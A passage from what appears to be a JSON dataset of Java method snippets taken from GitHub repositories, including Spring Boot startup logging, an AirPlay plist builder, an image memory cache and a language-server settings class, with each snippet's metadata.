"snippet": "\tprivate void appendOn(StringBuilder message) {\n\t\tlong startTime = System.currentTimeMillis();\n\t\tappend(message, \"on \", () -> InetAddress.getLocalHost().getHostName());\n\t\tlong resolveTime = System.currentTimeMillis() - startTime;\n\t\tif (resolveTime > HOST_NAME_RESOLVE_THRESHOLD) {\n\t\t\tlogger.warn(LogMessage.of(() -> {\n\t\t\t\tStringBuilder warning = new StringBuilder();\n\t\t\t\twarning.append(\"InetAddress.getLocalHost().getHostName() took \");\n\t\t\t\twarning.append(resolveTime);\n\t\t\t\twarning.append(\" milliseconds to respond.\");\n\t\t\t\twarning.append(\" Please verify your network configuration\");\n\t\t\t\tif (System.getProperty(\"os.name\").toLowerCase().contains(\"mac\")) {\n\t\t\t\t\twarning.append(\" (macOS machines may need to add entries to /etc/hosts)\");\n\t\t\t\t}\n\t\t\t\twarning.append(\".\");\n\t\t\t\treturn warning;\n\t\t\t}));\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/StartupInfoLogger.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 34177, "method_name": "appendPid", "class_name": "StartupInfoLogger", "params": ["StringBuilder"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "\tprivate void appendPid(StringBuilder message) {\n\t\tappend(message, \"with PID \", ApplicationPid::new);\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/StartupInfoLogger.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 34178, "method_name": "appendContext", "class_name": "StartupInfoLogger", "params": ["StringBuilder"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "\tprivate void appendContext(StringBuilder message) {\n\t\tStringBuilder context = new StringBuilder();\n\t\tApplicationHome home = new ApplicationHome(this.sourceClass);\n\t\tif (home.getSource() != null) {\n\t\t\tcontext.append(home.getSource().getAbsolutePath());\n\t\t}\n\t\tappend(context, \"started by \", () -> System.getProperty(\"user.name\"));\n\t\tappend(context, \"in \", () -> System.getProperty(\"user.dir\"));\n\t\tif (context.length() > 0) {\n\t\t\tmessage.append(\" (\");\n\t\t\tmessage.append(context);\n\t\t\tmessage.append(\")\");\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/StartupInfoLogger.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 34179, "method_name": "append", "class_name": "StartupInfoLogger", "params": ["StringBuilder", "String", "Callable<Object>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "\tprivate void append(StringBuilder message, String prefix, Callable<Object> call) {\n\t\tappend(message, prefix, call, \"\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/StartupInfoLogger.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 34180, "method_name": "append", "class_name": "StartupInfoLogger", "params": ["StringBuilder", "String", "Callable<Object>", "String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "\tprivate void append(StringBuilder message, String prefix, Callable<Object> call, String defaultValue) {\n\t\tObject result = callIfPossible(call);\n\t\tString value = (result != null) ? result.toString() : null;\n\t\tif (!StringUtils.hasLength(value)) {\n\t\t\tvalue = defaultValue;\n\t\t}\n\t\tif (StringUtils.hasLength(value)) {\n\t\t\tmessage.append((message.length() > 0) ? \" \" : \"\");\n\t\t\tmessage.append(prefix);\n\t\t\tmessage.append(value);\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/StartupInfoLogger.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 34181, "method_name": "callIfPossible", "class_name": "StartupInfoLogger", "params": ["Callable<Object>"], "throws": null, "modifiers": ["private"], "return_type": "Object", "snippet": "\tprivate Object callIfPossible(Callable<Object> call) {\n\t\ttry {\n\t\t\treturn call.call();\n\t\t}\n\t\tcatch (Exception ex) {\n\t\t\treturn null;\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/StartupInfoLogger.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 34182, "method_name": "plural", "class_name": "Language", "params": ["int", "String", "String", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String plural(int n, String one, String two, String five) {\n        n = Math.abs(n);\n\n        n %= 100;\n        if (n >= 5 && n <= 20)\n            return five;\n\n        n %= 10;\n        if (n == 1)\n            return one;\n\n        if (n >= 2 && n <= 4)\n            return two;\n\n        return five;\n    }", "url": "https://raw.githubusercontent.com/pi-181/num-methods-lab6/master/src/main/java/com/demkom58/divine/util/Language.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 34183, "method_name": "hello", "class_name": "SpringWebController", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String hello() {\n        return \"<h2>Hello, Spring Boot!<h2>\";\n    }", "url": "https://raw.githubusercontent.com/mqxu/spring-boot-review/master/spring-boot-start/src/main/java/com/soft1851/springboot/start/controller/SpringWebController.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34184, "method_name": "putKey", "class_name": "PListBuilder", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void putKey(String key) {\n        Element eKey = doc.createElement(\"key\");\n        eKey.setTextContent(key);\n        rootDict.appendChild(eKey);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/airplay/PListBuilder.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34185, "method_name": "putString", "class_name": "PListBuilder", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void putString(String key, String value) {\n        putKey(key);\n\n        Element eValue = doc.createElement(\"string\");\n        eValue.setTextContent(value);\n        rootDict.appendChild(eValue);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/airplay/PListBuilder.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34186, "method_name": "putReal", "class_name": "PListBuilder", "params": ["String", "double"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void putReal(String key, double value) {\n        putKey(key);\n\n        Element eValue = doc.createElement(\"real\");\n        eValue.setTextContent(String.valueOf(value));\n        rootDict.appendChild(eValue);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/airplay/PListBuilder.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34187, "method_name": "putInteger", "class_name": "PListBuilder", "params": ["String", "long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void putInteger(String key, long value) {\n        putKey(key);\n\n        Element eValue = doc.createElement(\"integer\");\n        eValue.setTextContent(String.valueOf(value));\n        rootDict.appendChild(eValue);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/airplay/PListBuilder.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34188, "method_name": "putBoolean", "class_name": "PListBuilder", "params": ["String", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void putBoolean(String key, boolean value) {\n        putKey(key);\n\n        String str = value? \"true\" : \"false\";\n        Element eValue = doc.createElement(str);\n        rootDict.appendChild(eValue);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/airplay/PListBuilder.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34189, "method_name": "putData", "class_name": "PListBuilder", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void putData(String key, String value) {\n        putKey(key);\n\n        Element eValue = doc.createElement(\"data\");\n        eValue.setTextContent(value);\n        rootDict.appendChild(eValue);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/airplay/PListBuilder.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34190, "method_name": "toString", "class_name": "PListBuilder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String toString() {\n        DOMSource domSource = new DOMSource(doc);\n        TransformerFactory tf = TransformerFactory.newInstance();\n        Transformer t;\n\n        StringWriter stringWriter = new StringWriter();\n\n        try {\n            t = tf.newTransformer();\n            t.setOutputProperty(OutputKeys.ENCODING, \"UTF-8\");\n            t.setOutputProperty(OutputKeys.DOCTYPE_PUBLIC, dt.getPublicId());\n            t.setOutputProperty(OutputKeys.DOCTYPE_SYSTEM, dt.getSystemId());\n            t.setOutputProperty(OutputKeys.INDENT, \"yes\");\n            t.setOutputProperty(\"{http://xml.apache.org/xslt}indent-amount\", \"2\");\n\n            StreamResult streamResult = new StreamResult(stringWriter);\n            t.transform(domSource, streamResult);\n        } catch (TransformerConfigurationException e) {\n            e.printStackTrace();\n        } catch (TransformerException e) {\n            e.printStackTrace();\n        }\n\n        return stringWriter.toString();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/airplay/PListBuilder.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34191, "method_name": "method01", "class_name": "GenericMethod", "params": ["M"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public <M> void method01(M m){\n        System.out.println(m);\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/13.%E3%80%90Collection%E3%80%81%E6%B3%9B%E5%9E%8B%E3%80%91-%E7%AC%94%E8%AE%B0/code/02_CollectionAndReflect/src/com/itheima/demo03/Generic/GenericMethod.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34192, "method_name": "method02", "class_name": "GenericMethod", "params": ["S"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static <S> void method02(S s){\n        System.out.println(s);\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/13.%E3%80%90Collection%E3%80%81%E6%B3%9B%E5%9E%8B%E3%80%91-%E7%AC%94%E8%AE%B0/code/02_CollectionAndReflect/src/com/itheima/demo03/Generic/GenericMethod.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34193, "method_name": "put", "class_name": "FIFOLimitedMemoryCache", "params": ["String", "Bitmap"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean put(String key, Bitmap value) {\n\t\tif (super.put(key, value)) {\n\t\t\tqueue.add(value);\n\t\t\treturn true;\n\t\t} else {\n\t\t\treturn false;\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Android-Universal-Image-Loader-master/library/src/com/nostra13/universalimageloader/cache/memory/impl/FIFOLimitedMemoryCache.java", "stars": "74", "class_props": {"extends": "LimitedMemoryCache", "implements": null, "modifiers": ["public"]}}, {"id": 34194, "method_name": "remove", "class_name": "FIFOLimitedMemoryCache", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void remove(String key) {\n\t\tBitmap value = super.get(key);\n\t\tif (value != null) {\n\t\t\tqueue.remove(value);\n\t\t}\n\t\tsuper.remove(key);\n\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Android-Universal-Image-Loader-master/library/src/com/nostra13/universalimageloader/cache/memory/impl/FIFOLimitedMemoryCache.java", "stars": "74", "class_props": {"extends": "LimitedMemoryCache", "implements": null, "modifiers": ["public"]}}, {"id": 34195, "method_name": "clear", "class_name": "FIFOLimitedMemoryCache", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void clear() {\n\t\tqueue.clear();\n\t\tsuper.clear();\n\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Android-Universal-Image-Loader-master/library/src/com/nostra13/universalimageloader/cache/memory/impl/FIFOLimitedMemoryCache.java", "stars": "74", "class_props": {"extends": "LimitedMemoryCache", "implements": null, "modifiers": ["public"]}}, {"id": 34196, "method_name": "getSize", "class_name": "FIFOLimitedMemoryCache", "params": ["Bitmap"], "throws": null, "modifiers": ["protected"], "return_type": "int", "snippet": "\tprotected int getSize(Bitmap value) {\n\t\treturn value.getRowBytes() * value.getHeight();\n\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Android-Universal-Image-Loader-master/library/src/com/nostra13/universalimageloader/cache/memory/impl/FIFOLimitedMemoryCache.java", "stars": "74", "class_props": {"extends": "LimitedMemoryCache", "implements": null, "modifiers": ["public"]}}, {"id": 34197, "method_name": "removeNext", "class_name": "FIFOLimitedMemoryCache", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "Bitmap", "snippet": "\tprotected Bitmap removeNext() {\n\t\treturn queue.remove(0);\n\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Android-Universal-Image-Loader-master/library/src/com/nostra13/universalimageloader/cache/memory/impl/FIFOLimitedMemoryCache.java", "stars": "74", "class_props": {"extends": "LimitedMemoryCache", "implements": null, "modifiers": ["public"]}}, {"id": 34198, "method_name": "createReference", "class_name": "FIFOLimitedMemoryCache", "params": ["Bitmap"], "throws": null, "modifiers": ["protected"], "return_type": "Reference<Bitmap>", "snippet": "\tprotected Reference<Bitmap> createReference(Bitmap value) {\n\t\treturn new WeakReference<Bitmap>(value);\n\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Android-Universal-Image-Loader-master/library/src/com/nostra13/universalimageloader/cache/memory/impl/FIFOLimitedMemoryCache.java", "stars": "74", "class_props": {"extends": "LimitedMemoryCache", "implements": null, "modifiers": ["public"]}}, {"id": 34199, "method_name": "getSettingFromJSON", "class_name": "Settings", "params": ["JsonElement", "String"], "throws": null, "modifiers": ["private", "static"], "return_type": "JsonElement", "snippet": "  private static JsonElement getSettingFromJSON(JsonElement jsonSettings, String name) {\n    for (String component : name.split(\"\\\\.\")) {\n      jsonSettings = jsonSettings.getAsJsonObject().get(component);\n    }\n\n    return jsonSettings;\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/Settings.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34200, "method_name": "convertJsonArrayToList", "class_name": "Settings", "params": ["JsonArray"], "throws": null, "modifiers": ["private", "static"], "return_type": "List<String>", "snippet": "  private static List<String> convertJsonArrayToList(JsonArray array) {\n    List<String> result = new ArrayList<>();\n    for (JsonElement element : array) result.add(element.getAsString());\n    return result;\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/Settings.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34201, "method_name": "setSettings", "class_name": "Settings", "params": ["JsonElement"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setSettings(JsonElement jsonSettings) {\n    try {\n      languageShortCode = getSettingFromJSON(jsonSettings, \"language\").getAsString();\n    } catch (NullPointerException | UnsupportedOperationException e) {\n      languageShortCode = null;\n    }\n\n    try {\n      String diagnosticSeverityString =\n          getSettingFromJSON(jsonSettings, \"diagnosticSeverity\").getAsString();\n\n      if (diagnosticSeverityString.equals(\"error\")) {\n        diagnosticSeverity = DiagnosticSeverity.Error;\n      } else if (diagnosticSeverityString.equals(\"warning\")) {\n        diagnosticSeverity = DiagnosticSeverity.Warning;\n      } else if (diagnosticSeverityString.equals(\"information\")) {\n        diagnosticSeverity = DiagnosticSeverity.Information;\n      } else if (diagnosticSeverityString.equals(\"hint\")) {\n        diagnosticSeverity = DiagnosticSeverity.Hint;\n      } else {\n        diagnosticSeverity = null;\n      }\n    } catch (NullPointerException | UnsupportedOperationException e) {\n      diagnosticSeverity = null;\n    }\n\n    try {\n      dictionary = convertJsonArrayToList(\n          getSettingFromJSON(jsonSettings, languageShortCode + \".dictionary\").\n          getAsJsonArray());\n    } catch (NullPointerException | UnsupportedOperationException e) {\n      dictionary = null;\n    }\n\n    try {\n      disabledRules = convertJsonArrayToList(\n          getSettingFromJSON(jsonSettings, languageShortCode + \".disabledRules\").\n          getAsJsonArray());\n    } catch (NullPointerException | UnsupportedOperationException e) {\n      disabledRules = null;\n    }\n\n    try {\n      enabledRules = convertJsonArrayToList(\n          getSettingFromJSON(jsonSettings, languageShortCode + \".enabledRules\").\n          getAsJsonArray());\n    } catch (NullPointerException | UnsupportedOperationException e) {\n      enabledRules = null;\n    }\n\n    try {\n      dummyCommandPrototypes = convertJsonArrayToList(\n          getSettingFromJSON(jsonSettings, \"commands.dummy\").getAsJsonArray());\n    } catch (NullPointerException | UnsupportedOperationException e) {\n      dummyCommandPrototypes = null;\n    }\n\n    try {\n      ignoreCommandPrototypes = convertJsonArrayToList(\n          getSettingFromJSON(jsonSettings, \"commands.ignore\").getAsJsonArray());\n    } catch (NullPointerException | UnsupportedOperationException e) {\n      ignoreCommandPrototypes = null;\n    }\n\n    try {\n      ignoreEnvironments = convertJsonArrayToList(\n          getSettingFromJSON(jsonSettings, \"environments.ignore\").getAsJsonArray());\n    } catch (NullPointerException | UnsupportedOperationException e) {\n      ignoreEnvironments = null;\n    }\n\n    try {\n      dummyMarkdownNodeTypes = convertJsonArrayToList(\n          getSettingFromJSON(jsonSettings, \"markdown.dummy\").getAsJsonArray());\n    } catch (NullPointerException | UnsupportedOperationException e) {\n      dummyMarkdownNodeTypes = null;\n    }\n\n    try {\n      ignoreMarkdownNodeTypes = convertJsonArrayToList(\n          getSettingFromJSON(jsonSettings, \"markdown.ignore\").getAsJsonArray());\n    } catch (NullPointerException | UnsupportedOperationException e) {\n      ignoreMarkdownNodeTypes = null;\n    }\n\n    try {\n      ignoreRuleSentencePairs = new ArrayList<>();\n\n      for (JsonElement element :\n            getSettingFromJSON(jsonSettings, \"ignoreRuleInSentence\").getAsJsonArray()) {\n        JsonObject elementObject = element.getAsJsonObject();\n        ignoreRuleSentencePairs.add(new IgnoreRuleSentencePair(\n            elementObject.get(\"rule\").getAsString(), elementObject.get(\"sentence\").getAsString()));\n      }\n    } catch (NullPointerException | UnsupportedOperationException e) {\n      ignoreRuleSentencePairs = null;\n    }\n\n    try {\n      motherTongueShortCode = getSettingFromJSON(\n          jsonSettings, \"additionalRules.motherTongue\").getAsString();\n    } catch (NullPointerException | UnsupportedOperationException e) {\n      motherTongueShortCode = null;\n    }\n\n    try {\n      languageModelRulesDirectory = getSettingFromJSON(\n          jsonSettings, \"additionalRules.languageModel\").getAsString();\n    } catch (NullPointerException | UnsupportedOperationException e) {\n      languageModelRulesDirectory = null;\n    }\n\n    try {\n      neuralNetworkModelRulesDirectory = getSettingFromJSON(\n          jsonSettings, \"additionalRules.neuralNetworkModel\").getAsString();\n    } catch (NullPointerException | UnsupportedOperationException e) {\n      neuralNetworkModelRulesDirectory = null;\n    }\n\n    try {\n      word2VecModelRulesDirectory = getSettingFromJSON(\n          jsonSettings, \"additionalRules.word2VecModel\").getAsString();\n    } catch (NullPointerException | UnsupportedOperationException e) {\n      word2VecModelRulesDirectory = null;\n    }\n\n    try {\n      initialJavaHeapSize = getSettingFromJSON(\n          jsonSettings, \"performance.initialJavaHeapSize\").getAsInt();\n    } catch (NullPointerException | UnsupportedOperationException e) {\n      initialJavaHeapSize = null;\n    }\n\n    try {\n      maximumJavaHeapSize = getSettingFromJSON(\n          jsonSettings, \"performance.maximumJavaHeapSize\").getAsInt();\n    } catch (NullPointerException | UnsupportedOperationException e) {\n      maximumJavaHeapSize = null;\n    }\n\n    try {\n      sentenceCacheSize = getSettingFromJSON(\n          jsonSettings, \"performance.sentenceCacheSize\").getAsInt();\n    } catch (NullPointerException | UnsupportedOperationException e) {\n      sentenceCacheSize = null;\n    }\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/Settings.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34202, "method_name": "clone", "class_name": "Settings", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "  public Object clone() {\n    Settings obj = new Settings();\n\n    obj.languageShortCode = languageShortCode;\n    obj.diagnosticSeverity = ((diagnosticSeverity == null) ? null : diagnosticSeverity);\n    obj.dictionary = ((dictionary == null) ? null : new ArrayList<>(dictionary));\n    obj.disabledRules = ((disabledRules == null) ? null : new ArrayList<>(disabledRules));\n    obj.enabledRules = ((enabledRules == null) ? null : new ArrayList<>(enabledRules));\n    obj.dummyCommandPrototypes = ((dummyCommandPrototypes == null) ? null :\n        new ArrayList<>(dummyCommandPrototypes));\n    obj.ignoreCommandPrototypes = ((ignoreCommandPrototypes == null) ? null :\n        new ArrayList<>(ignoreCommandPrototypes));\n    obj.ignoreEnvironments = ((ignoreEnvironments == null) ? null :\n        new ArrayList<>(ignoreEnvironments));\n    obj.dummyMarkdownNodeTypes = ((dummyMarkdownNodeTypes == null) ? null :\n        new ArrayList<>(dummyMarkdownNodeTypes));\n    obj.ignoreMarkdownNodeTypes = ((ignoreMarkdownNodeTypes == null) ? null :\n        new ArrayList<>(ignoreMarkdownNodeTypes));\n    obj.ignoreRuleSentencePairs = ((ignoreRuleSentencePairs == null) ? null :\n        new ArrayList<>(ignoreRuleSentencePairs));\n    obj.motherTongueShortCode = motherTongueShortCode;\n    obj.languageModelRulesDirectory = languageModelRulesDirectory;\n    obj.neuralNetworkModelRulesDirectory = neuralNetworkModelRulesDirectory;\n    obj.word2VecModelRulesDirectory = word2VecModelRulesDirectory;\n    obj.initialJavaHeapSize = initialJavaHeapSize;\n    obj.maximumJavaHeapSize = maximumJavaHeapSize;\n    obj.sentenceCacheSize = sentenceCacheSize;\n\n    return obj;\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/Settings.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34203, "method_name": "equals", "class_name": "Settings", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean equals(Object obj) {\n    if ((obj == null) || !Settings.class.isAssignableFrom(obj.getClass())) return false;\n    Settings other = (Settings)obj;\n\n    if ((languageShortCode == null) ? (other.languageShortCode != null) :\n          !languageShortCode.equals(other.languageShortCode)) {\n      return false;\n    }\n\n    if ((diagnosticSeverity == null) ? (other.diagnosticSeverity != null) :\n          (diagnosticSeverity != other.diagnosticSeverity)) {\n      return false;\n    }\n\n    if ((dictionary == null) ? (other.dictionary != null) :\n          !dictionary.equals(other.dictionary)) {\n      return false;\n    }\n\n    if ((disabledRules == null) ? (other.disabledRules != null) :\n          !disabledRules.equals(other.disabledRules)) {\n      return false;\n    }\n\n    if ((enabledRules == null) ? (other.enabledRules != null) :\n          !enabledRules.equals(other.enabledRules)) {\n      return false;\n    }\n\n    if ((dummyCommandPrototypes == null) ? (other.dummyCommandPrototypes != null) :\n          !dummyCommandPrototypes.equals(other.dummyCommandPrototypes)) {\n      return false;\n    }\n\n    if ((ignoreCommandPrototypes == null) ? (other.ignoreCommandPrototypes != null) :\n          !ignoreCommandPrototypes.equals(other.ignoreCommandPrototypes)) {\n      return false;\n    }\n\n    if ((ignoreEnvironments == null) ? (other.ignoreEnvironments != null) :\n          !ignoreEnvironments.equals(other.ignoreEnvironments)) {\n      return false;\n    }\n\n    if ((dummyMarkdownNodeTypes == null) ? (other.dummyMarkdownNodeTypes != null) :\n          !dummyMarkdownNodeTypes.equals(other.dummyMarkdownNodeTypes)) {\n      return false;\n    }\n\n    if ((ignoreMarkdownNodeTypes == null) ? (other.ignoreMarkdownNodeTypes != null) :\n          !ignoreMarkdownNodeTypes.equals(other.ignoreMarkdownNodeTypes)) {\n      return false;\n    }\n\n    if ((ignoreRuleSentencePairs == null) ? (other.ignoreRuleSentencePairs != null) :\n          !ignoreRuleSentencePairs.equals(other.ignoreRuleSentencePairs)) {\n      return false;\n    }\n\n    if ((motherTongueShortCode == null) ? (other.motherTongueShortCode != null) :\n          !motherTongueShortCode.equals(other.motherTongueShortCode)) {\n      return false;\n    }\n\n    if ((languageModelRulesDirectory == null) ? (other.languageModelRulesDirectory != null) :\n          !languageModelRulesDirectory.equals(other.languageModelRulesDirectory)) {\n      return false;\n    }\n\n    if ((neuralNetworkModelRulesDirectory == null) ?\n          (other.neuralNetworkModelRulesDirectory != null) :\n          !neuralNetworkModelRulesDirectory.equals(other.neuralNetworkModelRulesDirectory)) {\n      return false;\n    }\n\n    if ((word2VecModelRulesDirectory == null) ? (other.word2VecModelRulesDirectory != null) :\n          !word2VecModelRulesDirectory.equals(other.word2VecModelRulesDirectory)) {\n      return false;\n    }\n\n    if ((initialJavaHeapSize == null) ? (other.initialJavaHeapSize != null) :\n          !initialJavaHeapSize.equals(other.initialJavaHeapSize)) {\n      return false;\n    }\n\n    if ((maximumJavaHeapSize == null) ? (other.maximumJavaHeapSize != null) :\n          !maximumJavaHeapSize.equals(other.maximumJavaHeapSize)) {\n      return false;\n    }\n\n    if ((sentenceCacheSize == null) ? (other.sentenceCacheSize != null) :\n          !sentenceCacheSize.equals(other.sentenceCacheSize)) {\n      return false;\n    }\n\n    return true;\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/Settings.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34204, "method_name": "hashCode", "class_name": "Settings", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int hashCode() {\n    int hash = 3;\n\n    hash = 53 * hash + ((languageShortCode != null) ? languageShortCode.hashCode() : 0);\n    hash = 53 * hash + ((diagnosticSeverity != null) ? diagnosticSeverity.hashCode() : 0);\n    hash = 53 * hash + ((dictionary != null) ? dictionary.hashCode() : 0);\n    hash = 53 * hash + ((disabledRules != null) ? disabledRules.hashCode() : 0);\n    hash = 53 * hash + ((enabledRules != null) ? enabledRules.hashCode() : 0);\n    hash = 53 * hash + ((dummyCommandPrototypes != null) ? dummyCommandPrototypes.hashCode() : 0);\n    hash = 53 * hash + ((ignoreCommandPrototypes != null) ? ignoreCommandPrototypes.hashCode() : 0);\n    hash = 53 * hash + ((ignoreEnvironments != null) ? ignoreEnvironments.hashCode() : 0);\n    hash = 53 * hash + ((dummyMarkdownNodeTypes != null) ?\n        dummyMarkdownNodeTypes.hashCode() : 0);\n    hash = 53 * hash + ((ignoreMarkdownNodeTypes != null) ?\n        ignoreMarkdownNodeTypes.hashCode() : 0);\n    hash = 53 * hash + ((ignoreRuleSentencePairs != null) ? ignoreRuleSentencePairs.hashCode() : 0);\n    hash = 53 * hash + ((motherTongueShortCode != null) ? motherTongueShortCode.hashCode() : 0);\n    hash = 53 * hash + ((languageModelRulesDirectory != null) ?\n        languageModelRulesDirectory.hashCode() : 0);\n    hash = 53 * hash + ((neuralNetworkModelRulesDirectory != null) ?\n        neuralNetworkModelRulesDirectory.hashCode() : 0);\n    hash = 53 * hash + ((word2VecModelRulesDirectory != null) ?\n        word2VecModelRulesDirectory.hashCode() : 0);\n    hash = 53 * hash + ((initialJavaHeapSize != null) ?\n        initialJavaHeapSize.hashCode() : 0);\n    hash = 53 * hash + ((maximumJavaHeapSize != null) ?\n        maximumJavaHeapSize.hashCode() : 0);\n    hash = 53 * hash + ((sentenceCacheSize != null) ?\n        sentenceCacheSize.hashCode() : 0);\n\n    return hash;\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/Settings.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34205, "method_name": "getDefault", "class_name": "Settings", "params": ["T", "T"], "throws": null, "modifiers": ["private", "static"], "return_type": "T", "snippet": "  private static <T> T getDefault(T obj, T default_) {\n    return ((obj != null) ? obj : default_);\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/Settings.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34206, "method_name": "getLanguageShortCode", "class_name": "Settings", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getLanguageShortCode() {\n    return getDefault(languageShortCode, \"en-US\");\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/Settings.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34207, "method_name": "getDiagnosticSeverity", "class_name": "Settings", "params": [], "throws": null, "modifiers": ["public"], "return_type": "DiagnosticSeverity", "snippet": "  public DiagnosticSeverity getDiagnosticSeverity() {\n    return 